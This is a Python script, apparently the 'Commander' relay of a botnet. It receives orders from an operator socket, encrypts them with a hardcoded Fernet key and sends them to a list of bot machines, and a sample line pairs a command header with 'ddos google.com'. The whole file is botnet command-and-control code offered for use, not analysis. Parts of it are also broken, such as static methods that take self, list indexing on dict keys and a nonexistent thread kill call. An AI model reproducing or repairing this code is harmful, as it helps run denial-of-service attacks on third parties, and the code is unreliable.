import socket
import argparse
import threading
from random import randint
from cryptography.fernet import Fernet

icon = """\
█▀█ █▀█ ▀▀▀█ 
░▄▀ ░▄▀ ░░█░ 
█▄▄ █▄▄ ░▐▌░
"""

parser = argparse.ArgumentParser(prog='Commander.py')

parser.add_argument('-s', '--server')
parser.add_argument('-b', '--bots', nargs='*')

args = parser.parse_args()
instruction = ''

subjects = ["devices", "command", "failure", "botnet compromised"]

used_ids = []

group_id = 0

levels = {
    0: "info",
    1: "warning",
    2: "error",
    3: "failure",
    4: "critical failure",
    5: "botnet compromised"
}

header = {
    "subject": "",
    "level": 0,
    "ip": "",
    "group_id": 0
}


def generate_random_string(length=40):
    characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-&`'
    characters_length = len(characters)
    random_string = ''
    for i in range(length):
        random_string += characters[randint(0, characters_length - 1)]
    return random_string


def generate_random_number(length=10):
    numbers = '0123456789'
    numbers_length = len(numbers)
    random_number = ''
    for i in range(length):
        random_number += numbers[randint(0, numbers_length - 1)]

    if random_number in used_ids:
        generate_random_number(length)

    used_ids.append(random_number)
    return random_number


def create_header(subject: str, ip: str, level: str | int) -> dict:
    if isinstance(level, int):
        level = levels[level]

    if subject not in subjects:
        return {}

    custom_header = header.copy()
    custom_header['subject'] = subject
    custom_header['level'] = level
    custom_header['ip'] = ip
    custom_header['group_id'] = group_id
    return custom_header


class Commander:
    def __init__(self):
        self.instruction_socket = None
        self.soldiers = args.bots
        self.server_ip = args.server
        receiver = threading.Thread(target=self.get_orders)
        receiver.start()

        error_thread = threading.Thread(target=self.listen_errors)
        error_thread.start()

        client_connection = threading.Thread(target=self.clients_connection)
        client_connection.start()

    @staticmethod
    def clients_connection(self):
        active_connections: list = [0]
        while True:
            while active_connections[0] <= len(args.bots):
                manager_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                manager_socket.bind(('localhost', 12008))
                manager_socket.listen()

                client_addr, client_socket = None, None

                while client_addr is None and client_socket is None:
                    client_socket, client_addr = manager_socket.accept()

                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((client_addr, 12009))

                active_connections[0] += 1
                active_connections.append((client_socket, client_addr))

    @staticmethod
    def encrypt_package(self, package_header: dict, message: str):
        fernet = Fernet(b'cw_0x689RpI-jtRR7oE8h_eQsKImvJapLeSbXpwF4e4=')
        str_header = ''
        for i in range(len(package_header.keys())):
            str_header += package_header.keys()[i] + ' => ' + package_header.values()[i] + '\n'

        message_key = generate_random_string()
        str_header += f"message key => {message_key}"

        encrypted_header = fernet.encrypt(str_header.encode('utf-8'))
        first_encrypted_message = fernet.encrypt(message.encode('utf-8'))
        message_fernet = Fernet(message_key.encode('utf-8'))
        encrypted_message = message_fernet.encrypt(first_encrypted_message)

        return encrypted_header, encrypted_message

    def send_instructions(self, instruction_header: dict, instruction_content: str):
        random_id = generate_random_number()

        encrypted_header, encrypted_instruction = self.encrypt_package(instruction_header, instruction_content)
        encrypted_header += "IDENTIFIER" + random_id
        encrypted_instruction += "IDENTIFIER" + random_id

        for bot in self.soldiers:
            command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            command_socket.connect((bot, 12005))
            command_socket.send(encrypted_header)

            command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            command_socket.connect((bot, 12005))
            command_socket.send(encrypted_instruction)

        for index in range(len(used_ids)):
            if used_ids[index] == random_id:
                used_ids.pop(index)

    @staticmethod
    def listen_errors(self):
        # Function to deal with bots errors
        while True:
            receiving_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            receiving_socket.bind(('localhost', 12012))
            receiving_socket.listen()
            distant_socket, distant_addr = receiving_socket.accept()
            print(distant_socket.recv(8192).decode())

            for thread in threading.enumerate():
                thread.kill()

    def get_orders(self):
        self.instruction_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.instruction_socket.bind(('localhost', 12006))
        self.instruction_socket.listen()

        client_socket, client_address = self.instruction_socket.accept()
        global instruction

        instruction_level = 0

        while True:
            instruction = client_socket.recv(8192).decode()
            if instruction == 'kill':
                raise KilledByOfficer
            print(instruction)
            self.send_instructions(create_header('command', socket.gethostname(), instruction_level), instruction)


class KilledByOfficer(Exception):
    """Raised when connection is killed by distant officer"""

    def __init__(self, bot_commander: Commander):
        for bot in args.bots:
            kill_header = {
                "subject": subjects[3],
                "level": 5,
                "ip": socket.gethostname(),
                "group_id": group_id
            }

            kill_message = 'kill'
            bot_commander.send_instructions(kill_header, kill_message)


# commander = Commander()
print((create_header("command", "127.0.0.1", "info"), "ddos google.com"))
print(create_header("command", "127.0.0.1", 5))
